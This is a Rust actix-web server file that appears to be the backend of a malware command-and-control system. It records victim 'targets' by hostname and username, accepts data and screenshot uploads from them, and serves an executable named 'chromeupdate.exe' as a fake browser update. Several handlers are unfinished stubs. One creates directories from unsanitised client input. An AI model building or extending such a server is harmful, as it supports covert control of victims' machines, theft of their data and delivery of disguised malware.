use std::{fs, io::Write};
use actix_multipart::Multipart;
use serde::Deserialize;
use actix_web::{self, HttpRequest,Responder,web};


#[derive(Deserialize)]
pub struct Create {
    id: String,
    username:String
}
#[derive(Deserialize)]
pub struct Data {
    data:String
}



fn write_cache(data:String) -> Result<(),Box<dyn std::error::Error>> {
    let mut cache = fs::OpenOptions::new().append(true).open("targets.cache")?;
    cache.write(format!("{}\n",data).as_bytes())?;
    Ok(())
}

fn wriet_yml(key:String,val:String) -> Result<(),Box<dyn std::error::Error>>{
    let mut cache = fs::OpenOptions::new().append(true).open("targets.yml")?;
    cache.write(format!("{}: {}",key,val).as_bytes())?;
    Ok(())
}

pub async fn create(Create:web::Json<Create>) -> impl Responder{
    println!("{},{}",Create.id,Create.username);
    write_cache(format!("Created info for hostname {}, username {}",Create.id,Create.username)).unwrap();
    std::fs::create_dir(Create.id.to_owned()).unwrap();

    "Hello!"
}

pub async fn info(data:web::Json<Data>,req:HttpRequest) -> impl Responder{
    let qs = qstring::QString::from(req.query_string());
    println!("{} by {},{}",data.data,qs.get("username").unwrap(),qs.get("id").unwrap());
    "Hello!"
}
pub async fn rrindex(req: HttpRequest) -> actix_web::Result<actix_files::NamedFile> {
    Ok(actix_files::NamedFile::open("Aaaa")?)
}
pub async fn screenshot(multi:Multipart) -> impl Responder {
    "Oi"
}
pub async fn update(req:HttpRequest) -> impl Responder{
    println!("Got an update request");
    let file = 
     actix_files::NamedFile::open("content/chromeupdate.exe").unwrap();

    file
}


